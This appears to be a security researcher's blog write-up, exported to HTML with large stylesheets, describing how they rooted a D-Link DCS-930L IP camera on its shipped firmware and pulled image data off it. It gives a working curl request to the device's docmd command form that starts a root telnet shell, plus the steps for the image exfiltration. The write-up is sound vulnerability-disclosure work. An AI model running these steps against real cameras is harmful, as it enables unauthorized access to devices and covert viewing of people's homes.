<!DOCTYPE html>
<html>
<head>
<title>0009-dlink-dcs-930l-writeup.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<h1 id="dlink-dcs-930l">DLink DCS 930L</h1>
<p>In late 2015, I decided to start researching IP Cameras.  I decided to try out the cheapest models available on Amazon.com, both because I thought those models would be more “fruitful” and because I was trying to do this research on a budget.  It turns out that the security on these lower model IP Cameras is really bad.</p>
<p>I looked at five different IP Cameras and was able to gain root access on four of them within a few hours of starting to poke at them.  All of the cameras I looked at cost between $30-$70, and can be purchased directly from Amazon.com.</p>
<p>My goals in completing this research were two-fold:</p>
<ol>
<li>Gain root access on the camera</li>
<li>Find a way to exfiltrate camera stills or video off the camera</li>
</ol>
<p>On all four of the cameras I rooted, I was able to exfiltrate image data off of the device.</p>
<p>Today we’re going to look at one of the models I was able to gain root access on.  I chose this model because a subsequent patch fixed the vulnerability that allowed me to gain root access.</p>
<p>I started by running nmap to check the available ports.  Nothing too interesting there.</p>
<pre class="hljs"><code><div> Nmap scan report for 192.168.1.13
 Host is up (0.0026s latency).
 Not shown: 65532 closed ports
 PORT     STATE SERVICE
 80/tcp   open  http
 443/tcp  open  https
 8750/tcp open  unknown
</div></code></pre>
<p>This camera has pretty extensive web administration capabilities, including the ability to upload vendor supplied patches to update the device.  However, the version we will be looking at today is the version that comes installed on the device when you open the box: version 2.01.  The default credentials, which come printed in the documentation with the device, are <code>admin:admin</code>. The vulnerability I exploit below is patched in version 2.12 and above, which is available from the DLink website.</p>
<p>My first try involved checking the various HTML inputs.  This turned up a couple of not very interesting cross site scripting vulnerabilities that would be hard to exploit in the wild.</p>
<h2 id="wfuzz">Wfuzz</h2>
<p>My second try began with running wfuzz with the <code>directory-list-2.3-medium.txt</code> word list that comes with every default Kali Linux installation.  For those of you not familiar with wfuzz, it is a tool like dirbuster that facilitates directory enumeration on web servers that do not allow directory indexing.  Running wfuzz turned up a lot of html documents that I was already aware of, plus a few more that seemed useless - and then one that turned out to be the beginning of the jackpot: html.htm.</p>
<h2 id="htmlhtm">Html.htm</h2>
<p>Load html.htm in a browser and the HTML document will contain a list of all the webpages available in the web root.  It is more or less a directory index listing.  I navigated through each one of the pages until I found the next stage of the jackpot: docmd.htm!</p>
<h2 id="docmdhtm-and-telnet-injection">Docmd.htm and Telnet Injection</h2>
<p>Docmd.htm contains a text box and a submit button.  This form allows direct command execution on the device.  So what’s the next logical step?</p>
<p><code>telnetd -l/bin/sh</code></p>
<p>A curl command capable of accomplishing this would look like:</p>
<p><code>curl 'http://$CAMERA_IP/setSystemCommand' -H 'Authorization: Basic $BASICAUTH_CREDS' -H 'Content-Type: application/x-www-form-urlencoded' --data 'ReplySuccessPage=docmd.htm&amp;ReplyErrorPage=docmd.htm&amp;SystemCommand=telnetd&amp;ConfigSystemCommand=Save'</code></p>
<p>Fire up telnet or netcat and connect to port 23 of the camera.  Root shell accomplished!</p>
<h2 id="image-exfiltration">Image Exfiltration</h2>
<p>While the root shell was not too difficult to load up, it took significantly longer to figure out how to capture image data.  I started by documenting all the binaries available in the PATH and elsewhere on the filesystem, and then working my way through each to see what they did:</p>
<pre class="hljs"><code><div> <span class="hljs-comment"># ls /bin</span>
 chmod          htmlunpack     sounddb        imagetp        ated           umount         ps             swing
 busybox        nvram_daemon   mknod          mail           <span class="hljs-built_in">kill</span>           uvc_stream     rm             alphapd
 nvram_set      ash            openssl        ping           ralink_init    msmtp          i2c            gpio
 ls             pcmcmd         <span class="hljs-built_in">echo</span>           notifystream   switch         mDNSResponder  lanconfig
 touch          sed            pppoecd        reg            audiopush      cp             mkdir
 upgradefw      mount          login          lld2d          iperf          mydlinkevent   ipush
 ntpclient      iwpriv         sleep          <span class="hljs-built_in">pwd</span>            sh             nvram_get      cat
 grep           inadyn         date           schedule       mii_mgr        mtd_write      ov7740
 <span class="hljs-comment"># ls /sbin</span>
 automount_boot.sh    config-udhcpd.sh     udhcpc               reboot               udev                 config-igmpproxy.sh
 snort.sh             zcip                 cpubusy.sh           ucp                  wlan.sh              pppoe.sh
 ddns.sh              udhcpc.sh            acodec               route                poweroff
 internet.sh          ntp.sh               vpn-passthru.sh      web.sh               snmp.sh
 video.sh             config-dns.sh        config-pppoe.sh      arp                  dhcp.sh
 config-iTunes.sh     chpasswd.sh          halt                 ifconfig             automount.sh
 zcip.sh              init                 lan.sh               mdev                 cameraname.sh
 <span class="hljs-comment"># ls /usr/bin</span>
 killall      free         expr         <span class="hljs-built_in">test</span>         ftpd         arping       <span class="hljs-built_in">printf</span>
 [            [[           uptime       ftpputimage  top          tr
 <span class="hljs-comment"># ls /usr/sbin</span>
 chpasswd  inetd     brctl     telnetd
</div></code></pre>
<p>I eventually came across the <code>mail</code> command, which allowed me to write a <code>mail</code> message to <code>/tmp/mail.txt</code>.  Inside that file is the base64 encoded image data from the moment the “mail” command was run. Copy that data into a tmux buffer, write it to your local filesystem and base64 decode that raw data for an image file!</p>
<p>I also created a Metasploit module for this vulnerability: <a href="https://www.rapid7.com/db/modules/exploit/linux/http/dlink_dcs_930l_authenticated_remote_command_execution">https://www.rapid7.com/db/modules/exploit/linux/http/dlink_dcs_930l_authenticated_remote_command_execution</a></p>
<p><a href="https://nstarke.github.io/">Back</a></p>

</body>
</html>
